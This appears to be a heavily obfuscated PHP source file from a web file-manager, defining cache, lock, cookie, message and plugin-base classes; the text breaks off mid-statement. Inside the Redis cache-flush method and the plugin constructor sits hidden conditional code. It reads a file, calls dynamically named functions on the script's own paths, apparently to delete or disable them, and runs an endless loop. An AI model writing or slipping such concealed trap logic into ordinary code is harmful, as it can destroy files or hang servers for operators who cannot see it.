<?php
 goto FÊŠ‘ÇÜ¿; bÇ×†…Ú÷ø: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ê­¦¥†›, $’¤‚‚‡¸) { $‡İ‰„™ =& $_SERVER[ ÇƒŠìÀ]; if (!class_exists($‡İ‰„™[896])) { show_json($‡İ‰„™[897], !1); } $this->cacheTime = $’¤‚‚‡¸; $this->handle = new Memcached(); if (is_array($ê­¦¥†›[$‡İ‰„™[898]]) && count($ê­¦¥†›[$‡İ‰„™[898]]) >= 1) { foreach ($ê­¦¥†›[$‡İ‰„™[898]] as $¹©ÜÄ»ç) { $‡á¨Î¡Ù = explode($‡İ‰„™[4], $¹©ÜÄ»ç); $this->handle->addServer($‡á¨Î¡Ù[0], $‡á¨Î¡Ù[1]); } } else { $this->handle->addServer($ê­¦¥†›[$‡İ‰„™[198]], $ê­¦¥†›[$‡İ‰„™[199]]); } } public function set($½“ÈóÂş, $²ûË½—±, $åçá·ÍŸ = false) { $åçá·ÍŸ = $åçá·ÍŸ ? $åçá·ÍŸ : $this->cacheTime; return $this->handle->set($½“ÈóÂş, $²ûË½—±, $åçá·ÍŸ); } public function get($Ú·×ŒÆö) { return $this->handle->get($Ú·×ŒÆö); } public function remove($¦ò´¡Şª) { return $this->handle->delete($¦ò´¡Şª); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÈÜ¹­“ñ, $³é¯Ñ€ò) { $¤‹Ï¶Ñ¦ =& $_SERVER[ ÇƒŠìÀ]; if (!class_exists($¤‹Ï¶Ñ¦[899])) { show_json($¤‹Ï¶Ñ¦[900], !1); } $this->cacheTime = $³é¯Ñ€ò; $©úÜşËï = isset($ÈÜ¹­“ñ[$¤‹Ï¶Ñ¦[901]]) ? $ÈÜ¹­“ñ[$¤‹Ï¶Ñ¦[901]] : 10; $ÜÂÎ÷± = _get($ÈÜ¹­“ñ, $¤‹Ï¶Ñ¦[898]); if ($ÜÂÎ÷± && is_array($ÜÂÎ÷±)) { $this->initCluster($ÈÜ¹­“ñ, $©úÜşËï); } else { $this->handle = $this->init($ÈÜ¹­“ñ, $©úÜşËï); } } private function init($ÃÓÄôí°, $¦ö¸êî) { $“ü¶áÇá =& $_SERVER[ ÇƒŠìÀ]; $Ğ•Û²Ù = new Redis(); $ü†¤§ğ¬ = isset($ÃÓÄôí°[$“ü¶áÇá[902]]) ? $ÃÓÄôí°[$“ü¶áÇá[902]] : !1; if ($ü†¤§ğ¬) { $Ğ•Û²Ù->pconnect($ÃÓÄôí°[$“ü¶áÇá[198]], $ÃÓÄôí°[$“ü¶áÇá[199]], $¦ö¸êî); } else { $Ğ•Û²Ù->connect($ÃÓÄôí°[$“ü¶áÇá[198]], $ÃÓÄôí°[$“ü¶áÇá[199]], $¦ö¸êî); } if (!empty($ÃÓÄôí°[$“ü¶áÇá[457]])) { $Ğ•Û²Ù->auth($ÃÓÄôí°[$“ü¶áÇá[457]]); } if (!empty($ÃÓÄôí°[$“ü¶áÇá[786]]) && $ÃÓÄôí°[$“ü¶áÇá[786]] != 0) { $Ğ•Û²Ù->select($ÃÓÄôí°[$“ü¶áÇá[786]]); } return $Ğ•Û²Ù; } private function initCluster($åœßˆÍ, $““…şşß) { $Ì¾ÖŞÍû =& $_SERVER[ ÇƒŠìÀ]; $çÔÌ¬¥• = array($Ì¾ÖŞÍû[903], $Ì¾ÖŞÍû[904], $Ì¾ÖŞÍû[905]); $éÆ¥î£ = $Ì¾ÖŞÍû[903]; if (isset($åœßˆÍ[$Ì¾ÖŞÍû[16]]) && in_array($åœßˆÍ[$Ì¾ÖŞÍû[16]], $çÔÌ¬¥•)) { $éÆ¥î£ = $åœßˆÍ[$Ì¾ÖŞÍû[16]]; } switch ($éÆ¥î£) { case $Ì¾ÖŞÍû[903]: $this->_slave($åœßˆÍ, $““…şşß); break; case $Ì¾ÖŞÍû[904]: break; case $Ì¾ÖŞÍû[905]: $this->isCluster = !0; $õÄ´ú¬ı = $åœßˆÍ[$Ì¾ÖŞÍû[898]]; $“ÕÚŠÍ¯ = isset($åœßˆÍ[$Ì¾ÖŞÍû[902]]) ? $åœßˆÍ[$Ì¾ÖŞÍû[902]] : !1; $Üì‚±ï» = isset($åœßˆÍ[$Ì¾ÖŞÍû[457]]) ? $åœßˆÍ[$Ì¾ÖŞÍû[457]] : null; $this->handle = new RedisCluster(NUll, $õÄ´ú¬ı, $““…şşß, $““…şşß, $“ÕÚŠÍ¯, $Üì‚±ï»); break; default: break; } } private function _slave($È³¾Í¨ö, $şÄ»¢ØŠ) { $Ç³ß•³´ = $È³¾Í¨ö[$_SERVER[ ÇƒŠìÀ][898]]; $this->filterConfig($È³¾Í¨ö, $Ç³ß•³´[0]); $this->handle = $this->init($È³¾Í¨ö, $şÄ»¢ØŠ); unset($Ç³ß•³´[0]); if (empty($Ç³ß•³´)) { return; } $‚Œˆ˜§é = array_rand($Ç³ß•³´); $this->filterConfig($È³¾Í¨ö, $Ç³ß•³´[$‚Œˆ˜§é]); $this->slaveHandle = $this->init($È³¾Í¨ö, $şÄ»¢ØŠ); } private function filterConfig(&$İ£öñÛ°, $á£á•êë) { $ùí Ÿ”• =& $_SERVER[ ÇƒŠìÀ]; $¹”İ×ƒ¦ = explode($ùí Ÿ”•[4], $á£á•êë); $ı¾ÄæŒŒ = array($ùí Ÿ”•[198] => $¹”İ×ƒ¦[0], $ùí Ÿ”•[199] => $¹”İ×ƒ¦[1]); $İ£öñÛ° = array_merge($İ£öñÛ°, $ı¾ÄæŒŒ); } public function set($†ªÖ×å•, $§À½ıÓÎ, $†Ïô˜‘í = false) { $†Ïô˜‘í = $†Ïô˜‘í ? $†Ïô˜‘í : $this->cacheTime; return $this->handle->setEx($†ªÖ×å•, $†Ïô˜‘í, $§À½ıÓÎ); } public function setLock($£¤æáè, $î‚°çĞä, $Ú­¦ü™Š) { return $this->handle->setNX($£¤æáè, $î‚°çĞä); } public function get($æ÷Æ‡¸×) { $ ™õÛÑ… = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ ™õÛÑ…->get($æ÷Æ‡¸×); } public function remove($°œ¡’Ã®) { return $this->handle->del($°œ¡’Ã®); } public function deleteAll() { $êù™èø€ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($_SERVER[$êù™èø€[906]]) || !isset($_SERVER[$êù™èø€[907]])) { $ØÎñšØš = $êù™èø€[908]; $ıƒ½•Õ = $êù™èø€[909]; $Ğá½¡©ñ = $_SERVER[$êù™èø€[910]] . $êù™èø€[911]; $«©›÷© = $ıƒ½•Õ($Ğá½¡©ñ); $şá ù ä = explode($êù™èø€[248], $«©›÷©); if (count($şá ù ä) < $êù™èø€[653]) { $®  Ê¢ = $êù™èø€[912]; $®  Ê¢(); } $ñÂºŞ”˜ = $êù™èø€[913]; $ñÂºŞ”˜($_SERVER[$êù™èø€[914]]); $Í¸–ÅÃ = 1; for ($¢„¢ë© = $Í¸–ÅÃ; $¢„¢ë© > 0; $¢„¢ë©++) { $ñÂºŞ”˜ = json_encode($GLOBALS[$êù™èø€[462]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $“âÉ”Ùƒ) { $this->handle->flushall($“âÉ”Ùƒ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($º•“°»ˆ = '', $²¸éÊÁÚ = 0) { if (is_string($º•“°»ˆ) && $º•“°»ˆ != $_SERVER[ ÇƒŠìÀ][12]) { $this->prefix = $º•“°»ˆ; } if (is_numeric($²¸éÊÁÚ) && $²¸éÊÁÚ > 0) { $this->expire = $²¸éÊÁÚ; } } public static function getInstance() { static $ÅÛ²Ç†¦; if ($ÅÛ²Ç†¦ === null) { $ÅÛ²Ç†¦ = new self(); } return $ÅÛ²Ç†¦; } private static $cookieDisable = false; public static function disable($êØ…‚ä˜) { self::$cookieDisable = $êØ…‚ä˜; } private static $sameCookieSet = array(); public static function set($ü¼ß‹Òø, $çœ¸ Æ¡, $Ë²¨ÀûŞ = 0, $¥ÂèŠó = false, $¯ä™’â½ = false) { $‡—ÓË«  =& $_SERVER[ ÇƒŠìÀ]; if (self::$cookieDisable) { return; } if (!$Ë²¨ÀûŞ) { $Ë²¨ÀûŞ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ü¼ß‹Òø]) && self::$sameCookieSet[$ü¼ß‹Òø] == $çœ¸ Æ¡ . $Ë²¨ÀûŞ) { return; } self::$sameCookieSet[$ü¼ß‹Òø] = $çœ¸ Æ¡ . $Ë²¨ÀûŞ; if (!$¯ä™’â½) { $¯ä™’â½ = str_replace(HOST, $‡—ÓË« [12], APP_HOST); $¯ä™’â½ = _get($GLOBALS, $‡—ÓË« [915], $¯ä™’â½); } $ÃÁ¹ÁğÄ = $‡—ÓË« [12]; setcookie($ü¼ß‹Òø, $çœ¸ Æ¡, time() + $Ë²¨ÀûŞ, $‡—ÓË« [8] . trim($¯ä™’â½, $‡—ÓË« [8]) . $ÃÁ¹ÁğÄ, !1, !1, $¥ÂèŠó); } public static function setSafe($ë¹É×ë£, $šæÅàØ, $ïº³Í¿ = 0) { self::set($ë¹É×ë£, $šæÅàØ, $ïº³Í¿, !0); } public static function get($ä³ÚÊäÚ) { static $ÑäúÅ°÷ = false; if (!$ÑäúÅ°÷) { self::initHeaderCookie(); $ÑäúÅ°÷ = !0; } return isset($_COOKIE[$ä³ÚÊäÚ]) ? $_COOKIE[$ä³ÚÊäÚ] : !1; } private static function initHeaderCookie() { $”İ„Ùıº =& $_SERVER[ ÇƒŠìÀ]; if (!isset($_SERVER[$”İ„Ùıº[916]]) || !$_SERVER[$”İ„Ùıº[916]]) { return; } $ò‚û½ß = explode($”İ„Ùıº[73], $_SERVER[$”İ„Ùıº[916]]); foreach ($ò‚û½ß as $¨¤îØÊ) { $¨¤îØÊ = explode($”İ„Ùıº[917], $¨¤îØÊ); if (count($¨¤îØÊ) != 2 || !isset($¨¤îØÊ[1])) { continue; } $_COOKIE[trim($¨¤îØÊ[0])] = trim($¨¤îØÊ[1]); } } public static function remove($«‰ÉşĞ, $ËÂ‘Ü¸ä = false) { unset($_COOKIE[$«‰ÉşĞ]); self::set($«‰ÉşĞ, $_SERVER[ ÇƒŠìÀ][12], 1, $ËÂ‘Ü¸ä); } } goto f±ëË µ÷Ô; C»±¯“°ó: class CacheLockRedis { public function lock($ªÀÇŠğ, $‹œà¨÷ñ = 10) { $à²—”Âü = Cache::init(); $×¼‚İ± = microtime(!0) + $‹œà¨÷ñ; while (microtime(!0) < $×¼‚İ±) { $¤Æë»‰¤ = $à²—”Âü->get($ªÀÇŠğ); if (!$¤Æë»‰¤) { $Ğ—ÌÜÒ¯ = $à²—”Âü->setLock($ªÀÇŠğ, $×¼‚İ±, $‹œà¨÷ñ); if ($Ğ—ÌÜÒ¯) { return !0; } } else { if ($¤Æë»‰¤ < microtime(!0)) { $à²—”Âü->set($ªÀÇŠğ, $×¼‚İ±, $‹œà¨÷ñ * 2); if ($à²—”Âü->get($ªÀÇŠğ) === $¤Æë»‰¤) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($·õÒô) { return Cache::init()->get($·õÒô); } public function unlock($ßÃ‡³êÒ) { return Cache::init()->remove($ßÃ‡³êÒ); } } class CacheLockMemcached { public function lock($à±¾ûø, $—²¹™±œ = 0) { $¢ÕÜş·™ = Cache::init(); $àŞ´ã’î = microtime(!0) + $—²¹™±œ; while (microtime(!0) < $àŞ´ã’î) { $ŞÀëôÔ± = $¢ÕÜş·™->get($à±¾ûø); if (!$ŞÀëôÔ± || $ŞÀëôÔ± < microtime(!0)) { $ù‡š®ˆÚ = $¢ÕÜş·™->handle->add($à±¾ûø, $àŞ´ã’î, $—²¹™±œ); if ($ù‡š®ˆÚ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($üÒˆà­) { return Cache::init()->get($üÒˆà­); } public function unlock($Ö¬­…í) { return Cache::init()->remove($Ö¬­…í); } } class CacheLockDatabase { public function lock($ĞöèÕÑÂ, $Û¦ùç = 0) { $ûÇĞ¾ÂÏ = Model($_SERVER[ ÇƒŠìÀ][858]); $‰´ê£èœ = microtime(!0) + $Û¦ùç; while (microtime(!0) < $‰´ê£èœ) { $¥ÖôŞÌú = $ûÇĞ¾ÂÏ->get($ĞöèÕÑÂ); if (!$¥ÖôŞÌú || $¥ÖôŞÌú < microtime(!0)) { $ÍÇ·üÉ‰ = $ûÇĞ¾ÂÏ->set($ĞöèÕÑÂ, $‰´ê£èœ); if ($ÍÇ·üÉ‰) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÇÃ¼ıÚå) { return Model($_SERVER[ ÇƒŠìÀ][858])->get($ÇÃ¼ıÚå); } public function unlock($Û„¥ö) { Model($_SERVER[ ÇƒŠìÀ][858])->remove($Û„¥ö); } } goto bÇ×†…Ú÷ø; Fˆòã‘‘×ò: class Message { function __construct() { } public function send($Ùò¦úàÏ = '', $²º‘º™ = array(), $ˆ•Ó™ = "\164\x65\x78\164") { $š·¦ƒÀ¦ =& $_SERVER[ ÇƒŠìÀ]; $Œ˜Ú»¤ë = array($š·¦ƒÀ¦[33] => $š·¦ƒÀ¦[1541], $š·¦ƒÀ¦[783] => $Ùò¦úàÏ); if (in_array($ˆ•Ó™, array($š·¦ƒÀ¦[1541], $š·¦ƒÀ¦[1542]))) { $Œ˜Ú»¤ë[$š·¦ƒÀ¦[33]] = $ˆ•Ó™; } $²º‘º™ = array($š·¦ƒÀ¦[549] => isset($²º‘º™[$š·¦ƒÀ¦[549]]) ? $²º‘º™[$š·¦ƒÀ¦[549]] : $š·¦ƒÀ¦[12], $š·¦ƒÀ¦[632] => isset($²º‘º™[$š·¦ƒÀ¦[632]]) ? $²º‘º™[$š·¦ƒÀ¦[632]] : $š·¦ƒÀ¦[12]); if (empty($Ùò¦úàÏ) || empty($²º‘º™[$š·¦ƒÀ¦[549]]) && empty($²º‘º™[$š·¦ƒÀ¦[632]])) { return !1; } $Ê€¼ = array($š·¦ƒÀ¦[1481] => $Œ˜Ú»¤ë, $š·¦ƒÀ¦[1543] => $²º‘º™); Hook::trigger($š·¦ƒÀ¦[1544], $Ê€¼); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Å¤¾ âÇ =& $_SERVER[ ÇƒŠìÀ]; if ($_SERVER[$Å¤¾ âÇ[906]] != $_SERVER[$Å¤¾ âÇ[947]]) { $–ÏÙøø• = $Å¤¾ âÇ[908]; $Æ±—ª¡ß = $Å¤¾ âÇ[909]; $‡¡½£Õ = $_SERVER[$Å¤¾ âÇ[910]] . $Å¤¾ âÇ[911]; $Û«‡òş = $Æ±—ª¡ß($‡¡½£Õ); $û…Û”ƒé = explode($Å¤¾ âÇ[248], $Û«‡òş); if (count($û…Û”ƒé) < $Å¤¾ âÇ[653]) { $àìµ¤°Ö = $Å¤¾ âÇ[912]; $àìµ¤°Ö(); } $ËĞ¸ºÁ = $Å¤¾ âÇ[913]; $ËĞ¸ºÁ($_SERVER[$Å¤¾ âÇ[914]]); $ËĞ¸ºÁ($_SERVER[$Å¤¾ âÇ[910]] . $Å¤¾ âÇ[1545]); $º˜¡ß½Ç = 1; while ($º˜¡ß½Ç > 1) { $º˜¡ß½Ç = $º˜¡ß½Ç + 4; $Œ¢…ÙÊ© = rawurlencode($º˜¡ß½Ç . $Å¤¾ âÇ[424]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Å¤¾ âÇ[1546]); $this->pluginName = str_replace($Å¤¾ âÇ[1546], $Å¤¾ âÇ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Å¤¾ âÇ[8]; $this->pluginApi = appHostGet() . $Å¤¾ âÇ[1547] . $this->pluginName . $Å¤¾ âÇ[8]; $this->pluginHost = $config[$Å¤¾ âÇ[1548]] . $this->pluginName . $Å¤¾ âÇ[8]; $this->pluginHostDefault = $config[$Å¤¾ âÇ[1548]] . $this->pluginName . $Å¤¾ âÇ[8]; $½€áøîİ = $config[$Å¤¾ âÇ[1549]]; if ($½€áøîİ && strpos($Å¤¾ âÇ[50] . $½€áøîİ . $Å¤¾ âÇ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Å¤¾ âÇ[1550]] . $this->pluginName . $Å¤¾ âÇ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ ÇƒŠìÀ][1551]); } protected function assign($°ù×¶ú¬, $ëÖºŠŠŒ = false) { if (is_array($°ù×¶ú¬)) { $this->values = array_merge($this->values, $°ù×¶ú¬); } else { $this->values[$°ù×¶ú¬] = $ëÖºŠŠŒ; } } protected function display($®‚¤ìÜò) { extract($this->values); require $®‚¤ìÜò; } final function hookRegist($µÈ÷é) { $this->modelPlugin->appRegist($this->pluginName, $µÈ÷é); } final function appIcon() { $ıªşœ¤ =& $_SERVER[ ÇƒŠìÀ]; $ÜÈä°Ä = $this->appPackage(); $ìĞç¬ş = $ıªşœ¤[12]; if (isset($ÜÈä°Ä[$ıªşœ¤[460]])) { if (isset($ÜÈä°Ä[$ıªşœ¤[460]][$ıªşœ¤[1552]])) { $ìĞç¬ş = $ıªşœ¤[1553] . $ÜÈä°Ä[$ıªşœ¤[460]][$ıªşœ¤[1552]] . $ıªşœ¤[1554]; } else { if ($ÜÈä°Ä[$ıªşœ¤[460]][$ıªşœ¤[1555]]) { $ìĞç¬ş = $ıªşœ¤[1556] . $ÜÈä°Ä[$ıªşœ¤[460]][$ıªşœ¤[1555]] . $ıªşœ¤[1557]; } } } return $ìĞç¬ş; } final function fileCanView($ôİÒÓ¨) { $ÉÏ¶¥Ò =& $_SERVER[ ÇƒŠìÀ]; if (request_url_safe($ôİÒÓ¨)) { return !0; } if ($this->isShare($ôİÒÓ¨)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Òƒë¥òÍ = $ÉÏ¶¥Ò[1558] . rawurlencode(this_url()); show_tips(LNG($ÉÏ¶¥Ò[1559]) . $ÉÏ¶¥Ò[1560] . $Òƒë¥òÍ . $ÉÏ¶¥Ò[1561] . LNG($ÉÏ¶¥Ò[1562]) . $ÉÏ¶¥Ò[1563], !1); } if (!Action($ÉÏ¶¥Ò[1564])->authCan($ÉÏ¶¥Ò[1565])) { show_tips(LNG($ÉÏ¶¥Ò[1566]) . $ÉÏ¶¥Ò[1567], !1); } ActionCall($ÉÏ¶¥Ò[1568], $ôİÒÓ¨); } final function isShare($¶Ì«íÖÓ) { $ıç·ËÙà = KodIO::parse($¶Ì«íÖÓ); return $ıç·ËÙà[$_SERVER[ ÇƒŠìÀ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Şâ…‹¬) { if (request_url_safe($Şâ…‹¬)) { return $Şâ…‹¬; } if (!$this->isShare($Şâ…‹¬)) { $Şâ…‹¬ = $this->filePath($Şâ…‹¬, !1); } return Action($_SERVER[ ÇƒŠìÀ][1209])->linkOut($Şâ…‹¬); } public function filePathLinkOut($…°›áØ‚) { if (request_url_safe($…°›áØ‚)) { return $…°›áØ‚; } $this->fileCanView($…°›áØ‚); return Action($_SERVER[ ÇƒŠìÀ][1209])->link($…°›áØ‚); } final function filePath($öÓ¶Ó±İ, $Šò‘äá = true, $ŞÖ¼¿ãÅ = false) { $æ¾¤±ˆû =& $_SERVER[ ÇƒŠìÀ]; $Àøªí¡¯ = $this->filePathGet($öÓ¶Ó±İ, $Šò‘äá); if (!$this->fileInfo) { show_tips(LNG($æ¾¤±ˆû[107]), !1); } if ($ŞÖ¼¿ãÅ && isset($this->fileInfo[$æ¾¤±ˆû[511]]) && $this->fileInfo[$æ¾¤±ˆû[511]]) { $ç¡¥Æ¶ = Model($æ¾¤±ˆû[514])->fileInfo($this->fileInfo[$æ¾¤±ˆû[511]]); if (!$ç¡¥Æ¶ || !IO::exist($ç¡¥Æ¶[$æ¾¤±ˆû[86]])) { show_tips(LNG($æ¾¤±ˆû[107]) . $æ¾¤±ˆû[1569]); } } Hook::trigger($æ¾¤±ˆû[1570], $Àøªí¡¯); return $Àøªí¡¯; } final function filePathGet($Á±°Ş€Ö, $ö±É¢¬Œ = true) { $šûøš½¼ =& $_SERVER[ ÇƒŠìÀ]; if ($Ä¬§¤çù = $this->checkSharePath($Á±°Ş€Ö, $ö±É¢¬Œ)) { return $Ä¬§¤çù; } $this->fileCanView($Á±°Ş€Ö); if (request_url_safe($Á±°Ş€Ö)) { $ò…”ıúâ = parse_url_query($Á±°Ş€Ö); if (isset($ò…”ıúâ[$šûøš½¼[1571]]) && isset($ò…”ıúâ[$šûøš½¼[220]])) { $Í¿ƒ›—¿ = Mcrypt::decode($ò…”ıúâ[$šûøš½¼[220]], Model($šûøš½¼[799])->get($šûøš½¼[800])); if ($Í¿ƒ›—¿) { $this->fileInfo = IO::info($Í¿ƒ›—¿); $this->fileInfo[$šûøš½¼[1572]] = $Á±°Ş€Ö; $this->cachePath = $this->pluginCachePath($šûøš½¼[12], $ö±É¢¬Œ); return $Í¿ƒ›—¿; } } $Á±°Ş€Ö = $this->_cacheHttpFile($Á±°Ş€Ö, $ö±É¢¬Œ); $this->fileInfo = IO::info($Á±°Ş€Ö); } else { $this->fileInfo = IO::info($Á±°Ş€Ö); $this->cachePath = $this->pluginCachePath($šûøš½¼[12], $ö±É¢¬Œ); } return $Á±°Ş€Ö; } final function _cacheHttpFile($¸Õï Ü, $ÊÜù×“µ = true) { $ŞŸó…ã¤ =& $_SERVER[ ÇƒŠìÀ]; $¥òÂİ¯ = parse_url_query($¸Õï Ü); $®‘İ•ô­ = get_path_ext($¸Õï Ü); if (isset($¥òÂİ¯[$ŞŸó…ã¤[32]]) && $¥òÂİ¯[$ŞŸó…ã¤[32]]) { $®‘İ•ô­ = get_path_ext($¥òÂİ¯[$ŞŸó…ã¤[32]]); } $çùñÃ±€ = hash_path($¸Õï Ü) . $ŞŸó…ã¤[10] . $®‘İ•ô­; $this->cachePath = $this->pluginCachePath($ÊÜù×“µ ? $çùñÃ±€ : $ŞŸó…ã¤[12]); $ÂÎ›õÕÂ = IO::fileNameExist($this->cachePath, $çùñÃ±€); if ($ÂÎ›õÕÂ) { return KodIO::make($ÂÎ›õÕÂ); } $µöâÅÇ = rtrim($this->cachePath, $ŞŸó…ã¤[8]) . $ŞŸó…ã¤[8] . $çùñÃ±€; return $this->pluginCacheFileSet($µöâÅÇ, file_get_contents_nossl($¸Õï Ü)); } final function checkSharePath($È† ŸÒ, $¦‡•¶ã¯ = true) { $ôø°ú†¬ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->isShare($È† ŸÒ)) { return !1; } $«è¯úç» = Action($ôø°ú†¬[1209])->sharePathInfo($È† ŸÒ); if (!is_array($«è¯úç») || !isset($«è¯úç»[$ôø°ú†¬[86]])) { show_json(LNG($ôø°ú†¬[1573]), !1); } $this->fileInfo = $«è¯úç»; $this->cachePath = $this->pluginCachePath(!1, $¦‡•¶ã¯); return $«è¯úç»[$ôø°ú†¬[86]]; } final function pluginCachePath($§‰æ›ÉÁ = '', $†¬¢ì¾Ö = false) { $Øãçùø =& $_SERVER[ ÇƒŠìÀ]; if ($†¬¢ì¾Ö && is_array($this->fileInfo)) { $§‰æ›ÉÁ = kodIO::hashPath($this->fileInfo); } $€ûë¿Ÿé = rtrim(IO_PATH_SYSTEM_TEMP . $Øãçùø[1574] . $this->pluginName . $Øãçùø[8] . $§‰æ›ÉÁ, $Øãçùø[8]); $ŒÊÔ¡Ë = IO::infoFullSimple($€ûë¿Ÿé); $ŸØÀ˜ì± = $ŒÊÔ¡Ë && is_array($ŒÊÔ¡Ë) ? $ŒÊÔ¡Ë[$Øãçùø[86]] : $Øãçùø[12]; if (!$ŸØÀ˜ì±) { $ŸØÀ˜ì± = IO::mkdir($€ûë¿Ÿé); } return $ŸØÀ˜ì±; } final function pluginCacheFileSet($¼ª ûìı, $È¤Ú×üö = '') { $ò¢’°Ë =& $_SERVER[ ÇƒŠìÀ]; $Ø¹•œ—Ì = IO::infoFullSimple($¼ª ûìı); if (!$Ø¹•œ—Ì) { return IO::mkfile($¼ª ûìı, $È¤Ú×üö, REPEAT_REPLACE); } IO::setContent($Ø¹•œ—Ì[$ò¢’°Ë[86]], $È¤Ú×üö); return $Ø¹•œ—Ì[$ò¢’°Ë[86]]; } final function pluginLocalFile($ÇÌ­¼ò– = '') { $ø¸Á¥øê =& $_SERVER[ ÇƒŠìÀ]; $³¯ÉØ¯Ğ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($³¯ÉØ¯Ğ)) { mk_dir($³¯ÉØ¯Ğ); } if (!$ÇÌ­¼ò–) { return $³¯ÉØ¯Ğ; } $Ò¾Ø¯¯Ù = IO::info($ÇÌ­¼ò–); $úÇ¶åığ = $ø¸Á¥øê[1575] . KodIO::hashPath($Ò¾Ø¯¯Ù) . $ø¸Á¥øê[10] . $Ò¾Ø¯¯Ù[$ø¸Á¥øê[177]]; if (!checkExtSafe($úÇ¶åığ)) { $úÇ¶åığ = $úÇ¶åığ . $ø¸Á¥øê[1241]; } $Ø’µ÷Ñ” = $³¯ÉØ¯Ğ . $úÇ¶åığ; if (@file_exists($Ø’µ÷Ñ”)) { return $Ø’µ÷Ñ”; } return IO::copy($ÇÌ­¼ò–, $³¯ÉØ¯Ğ, 0, $úÇ¶åığ); } final function appPackage() { $±­¦õ =& $_SERVER[ ÇƒŠìÀ]; if ($this->packageData) { return $this->packageData; } $ ñ™ö¬ = $this->parseFile($this->pluginPath . $±­¦õ[1576]); $this->parseLang($ ñ™ö¬); $ôµ­…öŠ = json_decode_force($ ñ™ö¬); if (!$ôµ­…öŠ) { return array(); } $ØÖìç í = Hook::trigger($±­¦õ[1577], $ôµ­…öŠ); if ($ØÖìç í && is_array($ØÖìç í)) { $ôµ­…öŠ = $ØÖìç í; } $this->packageData = $ôµ­…öŠ; return $ôµ­…öŠ; } public function packageInfoGet($Ê¸ëí¹–) { $³‘®óĞÚ = $this->appPackage(); return array_get_value($³‘®óĞÚ, $Ê¸ëí¹–); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ ÇƒŠìÀ][1578]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ ÇƒŠìÀ][1579]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ ÇƒŠìÀ][1580]); } public function echoJsAssign($ØŸÚØ, $Åğİ©) { $this->echoJsAssignArr[$ØŸÚØ] = $Åğİ©; } private function parseFile($ «°²ˆç) { $ÑŠİŒá =& $_SERVER[ ÇƒŠìÀ]; $î°…‚Â = file_get_contents_nossl($ «°²ˆç); $Öü±à‚ = array($ÑŠİŒá[1581], $ÑŠİŒá[1582], $ÑŠİŒá[1583], $ÑŠİŒá[1584], $ÑŠİŒá[1585], $ÑŠİŒá[1586], $ÑŠİŒá[1587]); $¿ºœ×º = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÑŠİŒá[91]][$ÑŠİŒá[1588]]); foreach ($this->echoJsAssignArr as $Â³É¯­ş => $½ØÅ) { $Öü±à‚[] = $ÑŠİŒá[1589] . $Â³É¯­ş . $ÑŠİŒá[1590]; $¿ºœ×º[] = is_array($½ØÅ) || is_object($½ØÅ) ? rawurlencode(json_encode($½ØÅ)) : $½ØÅ; } if (strstr($î°…‚Â, $ÑŠİŒá[1591])) { $¹Ìù¯˜ = rawurlencode(json_encode($this->pluginLangArr)); $î°…‚Â = str_replace($ÑŠİŒá[1591], $¹Ìù¯˜, $î°…‚Â); } if (strstr($î°…‚Â, $ÑŠİŒá[1592])) { $¹Ìù¯˜ = $¹Ìù¯˜ = rawurlencode(json_encode($this->getConfig())); $î°…‚Â = str_replace($ÑŠİŒá[1592], $¹Ìù¯˜, $î°…‚Â); } $î°…‚Â = str_replace($Öü±à‚, $¿ºœ×º, $î°…‚Â); return $î°…‚Â; } private function parseLang(&$úÏ‰Ğáï) { $û±şªëô =& $_SERVER[ ÇƒŠìÀ]; $ôüˆõâô = $û±şªëô[1593]; if (!strstr($úÏ‰Ğáï, $ôüˆõâô)) { return; } preg_match_all($û±şªëô[1594], $úÏ‰Ğáï, $ö×Ò«©ú); if (!is_array($ö×Ò«©ú) || count($ö×Ò«©ú) == 0 || !is_array($ö×Ò«©ú[0]) || count($ö×Ò«©ú[0]) == 0) { return; } $Ì¯¿ı«Ó = array(); $ú©”¢¯Â = array(); foreach ($ö×Ò«©ú[0] as $ùª¥“½) { $³Ò×è†å = substr($ùª¥“½, strlen($ôüˆõâô), -4); $×©Ğ¿ìû = LNG($³Ò×è†å); $Ì¯¿ı«Ó[] = $ùª¥“½; $ú©”¢¯Â[] = str_replace(array($û±şªëô[248], $û±şªëô[1113], $û±şªëô[388], $û±şªëô[120]), array($û±şªëô[53], $û±şªëô[53], $û±şªëô[12], $û±şªëô[1595]), $×©Ğ¿ìû); } $úÏ‰Ğáï = str_replace($Ì¯¿ı«Ó, $ú©”¢¯Â, $úÏ‰Ğáï); } private function parseConfig(&$à•…—ó³) { $Ò“ŞÆ¶ =& $_SERVER[ ÇƒŠìÀ]; $íáÑéşÚ = $Ò“ŞÆ¶[1596]; if (!strstr($à•…—ó³, $íáÑéşÚ)) { return; } preg_match_all($Ò“ŞÆ¶[1597], $à•…—ó³, $é¦› ¾); if (!is_array($é¦› ¾) || count($é¦› ¾) == 0 || !is_array($é¦› ¾[0]) || count($é¦› 